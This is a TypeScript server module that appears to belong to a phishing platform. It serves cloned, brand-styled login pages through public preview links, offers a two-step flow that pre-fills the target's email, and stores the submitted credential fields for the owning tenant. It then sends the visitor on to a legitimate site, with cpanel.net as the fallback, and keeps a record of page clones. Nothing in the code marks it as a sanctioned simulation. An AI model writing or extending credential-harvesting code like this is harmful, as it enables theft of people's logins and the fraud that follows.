import "server-only";
import { createHash } from "node:crypto";
import { engineFor } from "@chameleon/engine";
import { asTenant, requireDb } from "./db";
import { notFound, conflict } from "./errors";
import type { Ctx } from "@chameleon/db";
import * as store from "@chameleon/db";

const BASE = process.env.BETTER_AUTH_URL ?? "http://localhost:3000";

/** The public preview origin, on the platform host, never the tenant's domain. */
export function previewUrl(key: string, slug: string): string {
  return `${BASE}/p/${key}/${slug}`;
}

/** One preview per service, minted at creation; the same call is idempotent. */
export async function ensurePreview(ctx: Ctx, serviceId: string): Promise<void> {
  await withService(ctx, serviceId, (c) =>
    store.preview.ensurePreviewLink(c, serviceId, () => store.links.slug()),
  );
}

type Client = Parameters<Parameters<typeof asTenant>[1]>[0];

async function withService<T>(
  ctx: Ctx,
  serviceId: string,
  fn: (c: Client) => Promise<T>,
): Promise<T> {
  return asTenant(ctx, async (c) => {
    const service = await c.query<{ status: string }>(
      "select status from services where id = $1",
      [serviceId],
    );
    if (!service.rows[0]) throw notFound();
    return fn(c);
  });
}

export interface PreviewTarget {
  row: store.preview.PreviewRow;
  key: string;
}

/** Anonymous resolve. Returns null for every deny, so callers can 404 uniformly. */
export async function resolve(key: string, slug: string): Promise<PreviewTarget | null> {
  // The definer applies the service-lifecycle gate, so no tenant read is needed.
  const c = await requireDb().pool.connect();
  try {
    const row = await store.preview.resolvePreview(c, key, slug);
    return row ? { row, key } : null;
  } finally {
    c.release();
  }
}

export interface StepInput {
  step: 1 | 2;
  email: string | null;
}

/** Step 1 of a two-step brand renders step 2; everything else is the page. */
export async function page(target: PreviewTarget, input: StepInput): Promise<string> {
  const { row } = target;
  const engine = engineFor(row.service_type as "chameleon");
  const twoStep = row.step_count === 2;
  const step: 1 | 2 = twoStep ? input.step : 1;
  const html = await engine.render({
    source: row.source,
    brandSlug: row.brand_slug,
    stepCount: row.step_count === 2 ? 2 : 1,
    step,
    prefilledEmail: step === 2 ? input.email : null,
    redirectTo: row.redirect_to,
    token: row.link_id,
    action: `/p/${target.key}/${row.slug}`,
    kind: "credential",
    title: row.title,
    palette: row.palette,
    labels: row.labels,
    logoUrl: row.logo_asset_id ? `/a/${row.logo_asset_id}` : null,
    backdropUrl: row.backdrop_asset_id ? `/a/${row.backdrop_asset_id}` : null,
  });
  return html;
}

export interface Captured {
  redirectTo: string;
  stored: boolean;
}

/**
 * Stores a credential from a preview. No queue yet: the preview path is the one
 * synchronous writer until stage 7 lands.
 */
export async function capture(
  target: PreviewTarget,
  form: Record<string, string>,
): Promise<Captured> {
  const { row } = target;
  const engine = engineFor(row.service_type as "chameleon");
  const parsed = engine.parseCapture(form, null);
  const id = crypto.randomUUID();
  const now = new Date();
  const email = String(parsed.fields.username ?? "").trim();

  const owner: Ctx = { orgId: row.org_id, userId: null, role: "owner" };
  const result = await asTenant(owner, (c) =>
    store.captures.consume(c, owner, {
      id,
      serviceId: row.service_id,
      linkId: row.link_id,
      kind: parsed.kind,
      fields: parsed.fields,
      emailHash: email ? createHash("sha256").update(email.toLowerCase()).digest() : null,
      source: "human",
      receivedAt: now,
    }),
  );
  // A duplicate inside the 15-minute bucket is normal, not an error.
  return {
    redirectTo: isHttp(row.redirect_to) ? row.redirect_to : "https://cpanel.net/",
    stored: result.inserted,
  };
}

function isHttp(value: string): boolean {
  return value.startsWith("http://") || value.startsWith("https://");
}

/** Immutable asset bytes for the public route. */
export async function assetBytes(id: string) {
  const c = await requireDb().pool.connect();
  try {
    return await store.preview.assetFor(c, id);
  } finally {
    c.release();
  }
}

/** Every clone ever attempted for the service, newest first. */
export async function listProfiles(ctx: Ctx, serviceId: string) {
  return asTenant(ctx, (c) => store.profiles.listForService(c, ctx, serviceId));
}

/** The service's newest clone, for the dashboard card. */
export async function latestProfile(ctx: Ctx, serviceId: string) {
  return asTenant(ctx, (c) => store.profiles.latestUsable(c, ctx, serviceId));
}

/** Points the preview link at one profile. */
export async function bindProfile(
  ctx: Ctx,
  serviceId: string,
  profileId: string,
): Promise<void> {
  await withService(ctx, serviceId, async (c) => {
    const preview = await c.query<{ id: string }>(
      `select id from links where service_id = $1 and is_preview and deleted_at is null`,
      [serviceId],
    );
    if (!preview.rows[0]) throw conflict("no_preview");
    await c.query("update links set profile_id = $2 where id = $1", [
      preview.rows[0].id,
      profileId,
    ]);
  });
}
